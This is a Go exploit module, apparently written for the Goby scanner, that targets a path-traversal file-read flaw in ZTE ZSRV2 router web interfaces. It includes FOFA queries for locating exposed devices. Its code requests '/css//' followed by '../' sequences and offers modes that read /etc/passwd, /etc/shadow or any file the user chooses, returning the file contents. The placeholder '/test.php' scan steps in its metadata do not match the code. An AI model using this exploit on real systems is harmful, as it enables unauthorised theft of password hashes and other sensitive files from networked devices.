package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ZTE-WLAN-Wireless-Access-Controller ZSRV2 /css  File Read Vulnerability",
    "Description": "<p>ZTE ZSRV2 Router is an intelligent integrated multi-service router product launched by ZTE that integrates routing, switching, wireless, security, and VPN, and builds an intelligent, efficient, reliable, flexible, and easy-to-maintain network for users with a modular and scalable system architecture.  </p><p>ZTE ZSRV2 router has a file read vulnerability. An attacker can construct a special URL to read sensitive information about the system.</p>",
    "Product": "ZTE-WLAN-Wireless-Access-Controller",
    "Homepage": "https://www.zte.com.cn/china/index.html",
    "DisclosureDate": "2024-08-30",
    "PostTime": "2024-09-03",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"ZSRV2路由器Web管理系统\" && body=\"jslib/easyDialog.js\"",
    "GobyQuery": "title=\"ZSRV2路由器Web管理系统\" && body=\"jslib/easyDialog.js\"",
    "Level": "1",
    "Impact": "<p>ZTE ZSRV2 router has a file read vulnerability. An attacker can construct a special URL to read sensitive information about the system.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/141717378"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "shadow,passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../../../../../../../../etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "中兴 ZSRV2路由器 /css 文件读取漏洞",
            "Product": "中兴通讯-WLAN无线接入控制器",
            "Description": "<p>中兴 ZSRV2路由器是中兴通讯推出的集路由、交换、无线、安全、 VPN 于一体的智能集成多业务路由器产品，凭借模块化、可扩展的系统架构，为用户构建智能、高效、可靠、灵活、易维的网络。&nbsp;<br></p><p>中兴 ZSRV2路由器存在文件读取漏洞。攻击者通过构造特殊URL地址，可以读取系统敏感信息。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>中兴 ZSRV2路由器存在文件读取漏洞。攻击者通过构造特殊URL地址，可以读取系统敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ZTE-WLAN-Wireless-Access-Controller ZSRV2 /css  File Read Vulnerability",
            "Product": "ZTE-WLAN-Wireless-Access-Controller",
            "Description": "<p>ZTE ZSRV2 Router is an intelligent integrated multi-service router product launched by ZTE that integrates routing, switching, wireless, security, and VPN, and builds an intelligent, efficient, reliable, flexible, and easy-to-maintain network for users with a modular and scalable system architecture.&nbsp;&nbsp;</p><p>ZTE ZSRV2 router has a file read vulnerability. An attacker can construct a special URL to read sensitive information about the system.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>ZTE ZSRV2 router has a file read vulnerability. An attacker can construct a special URL to read sensitive information about the system.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9950"
}`
	postOrGet_zxciaszhfyuahusdfgyasnhudgasuijdi7aghsctgbasca := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/css//" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/css//../../../../../../../../etc/passwd"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../../../../../../../../etc/passwd": "root:",
			}
			// 函数继承
			uploadFileFunc := postOrGet_zxciaszhfyuahusdfgyasnhudgasuijdi7aghsctgbasca

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"../../../../../../../../etc/passwd", "root:"},
				"shadow": {"../../../../../../../../etc/shadow", "root:"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_zxciaszhfyuahusdfgyasnhudgasuijdi7aghsctgbasca

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
